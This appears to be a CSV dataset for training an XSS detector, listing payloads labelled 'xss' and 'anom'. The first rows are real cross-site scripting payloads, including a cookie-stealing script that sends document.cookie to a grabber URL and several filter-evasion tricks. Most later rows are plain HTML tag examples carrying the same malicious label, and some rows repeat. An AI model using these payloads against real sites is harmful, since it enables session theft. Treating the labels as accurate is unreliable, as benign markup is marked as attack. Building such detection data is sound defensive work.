payload,attack_type,label
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>,xss,anom
<script>alert('XSS')</script>,xss,anom
<scr<script>ipt>alert('XSS')</scr<script>ipt>,xss,anom
"""><script>alert('XSS')</script>",xss,anom
<img src=x onerror=alert('XSS');>,xss,anom
<svg/onload=alert('XSS')>,xss,anom
"<div onpointerover=""alert(45)"">MOVE HERE</div>",xss,anom
<body onload=alert(/XSS/.source)>,xss,anom
<input autofocus onfocus=alert(1)>,xss,anom
<select autofocus onfocus=alert(1)>,xss,anom
<textarea autofocus onfocus=alert(1)>,xss,anom
<keygen autofocus onfocus=alert(1)>,xss,anom
<video/poster/onerror=alert(1)>,xss,anom
"<video><source onerror=""javascript:alert(1)"">",xss,anom
"<video src=_ onloadstart=""alert(1)"">",xss,anom
"<details/open/ontoggle=""alert`1`"">",xss,anom
<audio src onloadstart=alert(1)>,xss,anom
<marquee onstart=alert(1)>,xss,anom
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>,xss,anom
<script src=14.rs>,xss,anom
"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)"">",xss,anom
-(confirm)(document.domain)//; alert(1);//,xss,anom
URL/<svg onload=alert(1)>,xss,anom
java%0ascript:alert(1)   - LF (\n),xss,anom
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\),xss,anom
javascript://%0Aalert(1),xss,anom
javascript://anything%0D%0A%0D%0Awindow.alert(1),xss,anom
"data:text/html,<script>alert(0)</script>",xss,anom
"vbscript:msgbox(""XSS"")<name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name><something:scriptxmlns:something=""http://www.w3.org/1999/xhtml"">alert(1)</something:script><svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",xss,anom
player.swf?playerready=alert(document.cookie),xss,anom
"<a href=""https://www.w3schools.com"">Visit W3Schools.com!</a>",xss,anom
"<abbr title=""World Health Organization"">WHO</abbr>",xss,anom
"<acronym title=""as soon as possible"">ASAP</acronym>",xss,anom
"<address>Written by <a href=""mailto:webmaster@example.com"">Jon Doe</a>.<br></address>",xss,anom
"<applet code=""Bubbles.class"" width=""350"" height=""350"">Java applet that draws animated bubbles.</applet>",xss,anom
"<area shape=""rect"" coords=""0,0,82,126"" href=""sun.htm"" alt=""Sun"">",xss,anom
<article><h1>Google Chrome</h1></article>,xss,anom
<aside><h4>Epcot Center</h4></aside>,xss,anom
"<audio controls><source src=""horse.ogg"" type=""audio/ogg""></audio>",xss,anom
<b>and this is bold text</b>,xss,anom
"<base href=""https://www.w3schools.com/"" target=""_blank"">",xss,anom
"<basefont color=""red"" size=""5"">",xss,anom
script  ,xss,anom
"<bdo dir=""rtl""></bdo>",xss,anom
<big>Bigger text</big>,xss,anom
"<blockquote cite=""http://www.worldwildlife.org/who/index.html""></blockquote>",xss,anom
<body></body>,xss,anom
<br><br/>,xss,anom
"<button type=""button"">Click Me!</button>",xss,anom
"<canvas id=""myCanvas""></canvas>",xss,anom
<caption>Monthly savings</caption>,xss,anom
<fieldset><legend>Personalia:</legend></fieldset>,xss,anom
<footer><p>Posted by: Hege Refsnes</p></footer>,xss,anom
"top[""al""+""ert""](5);",xss,anom
top[8680439..toString(30)](7);,xss,anom
Set.constructor('ale'+'rt(13)')();,xss,anom
te' * alert('*') * 'xt';,xss,anom
<samp>Sample output from a computer program</samp>,xss,anom
"<script>document.getElementById(""demo"").innerHTML = ""Hello JavaScript!""</script>",xss,anom
<br><br/>,xss,anom
"<button type=""button"">Click Me!</button>",xss,anom
"<canvas id=""myCanvas""></canvas>",xss,anom
<caption>Monthly savings</caption>,xss,anom
<center>This text will be center-aligned.</center>,xss,anom
<cite>The Scream</cite>,xss,anom
<code>A piece of computer code</code>,xss,anom
"<col span=""2"" style=""background-color:",xss,anom
"<colgroup><col span=""2"" style=""background-color:red""></colgroup>",xss,anom
"<data value=""21053"">Cherry Tomato</data>",xss,anom
"<datalist id=""browsers""><option value=""Internet Explorer""></datalist>",xss,anom
<dd>Black hot drink</dd>,xss,anom
<del>blue</del>,xss,anom
<details></details>,xss,anom
<dfn>HTML</dfn>,xss,anom
<dialog open>This is an open dialog window</dialog>,xss,anom
<dir><li>html</li></dir>,xss,anom
<dl></dl>,xss,anom
<dt>Coffee</dt>,xss,anom
<em>Emphasized text</em>,xss,anom
<fieldset><legend>Personalia:</legend></fieldset>,xss,anom
"<figcaption>Fig.1 - Trulli, Puglia, Italy.</figcaption>",xss,anom
"<figure><img src=""img_pulpit.jpg"" alt=""The Pulpit Rock"" width=""304"" height=""228""></figure>",xss,anom
"<font size=""3"" color=""red"">This is some text!</font>",xss,anom
<footer><p>Posted by: Hege Refsnes</p></footer>,xss,anom
"<form action=""/action_page.php"" method=""get""><input type=""text"" name=""fname""><br></form>",xss,anom
"<frameset cols=""25%,*,25%""><frame src=""frame_a.htm""></frameset>",xss,anom
<h1>This is heading 1</h1>,xss,anom
<h2>This is heading 2</h2>,xss,anom
<h3>This is heading 3</h3>,xss,anom
<h4>This is heading 4</h4>,xss,anom
<h5>This is heading 5</h5>,xss,anom
<h6>This is heading 6</h6>,xss,anom
<head><title>Title of the document</title></head>,xss,anom
<header><h1>Most important heading here</h1></header>,xss,anom
<html></html>,xss,anom
<i>The lightning</i>,xss,anom
"<iframe src=""https://www.w3schools.com""></iframe>",xss,anom
"<input type=""text"" id=""lname"" name=""lname"">",xss,anom
"<param name=""autoplay"" value=""true"">",xss,anom
"<picture><source media=""(min-width: 650px)"" srcset=""img_pink_flowers.jpg""></picture>",xss,anom
<pre>Text in a pre element</pre>,xss,anom
"<progress id=""file"" value=""32"" max=""100""> 32% </progress>",xss,anom
<q>Build a future where people live in harmony with nature.</q>,xss,anom
<rt><rp></rp></rt>,xss,anom
<rt></rt>,xss,anom
<ruby><rt></rt></ruby>,xss,anom
<s>My car is blue.</s>,xss,anom
<samp>Sample output from a computer program</samp>,xss,anom
"<script>document.getElementById(""demo"").innerHTML = ""Hello JavaScript!""</script>",xss,anom
<section><h1>WWF</h1></section>,xss,anom
"<select id=""cars""><option value=""volvo"">Volvo</option></select>",xss,anom
<small>Copyright 1999-2050 by Refsnes Data</small>,xss,anom
"<source src=""horse.ogg"" type=""audio/ogg"">",xss,anom
"<span style=""color:blue"">blue</span>",xss,anom
"<table><tr><th>Month</th><th>Savings</th></tr><tr><td>January</td><td>$100</td></tr></table>
",xss,anom
"<template><h2>Flower</h2><img src=""img_white_flower.jpg""></template>",xss,anom
"<textarea id=""w3mission"" rows=""4"" cols=""50"">At w3schools.com </textarea>",xss,anom
"<span style=""color:blue"">blue</span>",xss,anom
<strike>not yet available!</strike>,xss,anom
<strong>Strong text</strong>,xss,anom
<style>h1 {color:red;}p {color:blue;}</style>,xss,anom
<sub>subscript</sub>,xss,anom
<sup>superscript</sup> ,xss,anom
"<svg width=""100"" height=""100"">circle cx=""50"" cy=""50"" r=""40"" stroke=""green"" stroke-width=""4"" fill=""yellow"" /></svg>",xss,anom
<time>10:00</time>,xss,anom
"<video width=""320"" height=""240"" controls><source src=""movie.mp4"" type=""video/mp4""></video>",xss,anom
<wbr>Http<wbr>,xss,anom
"<button type=""button"" onload=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onunload=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onchange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onsubmit=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onreset=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onselect=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onkeydown=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onkeypress=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondblclick=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmousemove=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmouseout=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmouseover=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmouseup=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" Offline=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" Onabort=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onafterprint=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onbeforeonload=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onbeforeprint=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onblur=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" oncanplay=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" oncanplaythrough=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onchange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onclick=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" oncontextmenu=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondragend=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondragenter=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondragleave=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondragover=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondragstart=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondrop=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ondurationchange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onkeyup=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onloadeddata=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onloadedmetadata=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onloadstart=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onforminput=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onhaschange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmessage=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmousewheel=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmousemove=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onmouseout=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onoffline=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onformchange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" ononline=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onpagehide=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onpageshow=""function()"">Click Me!</button>",xss,anom
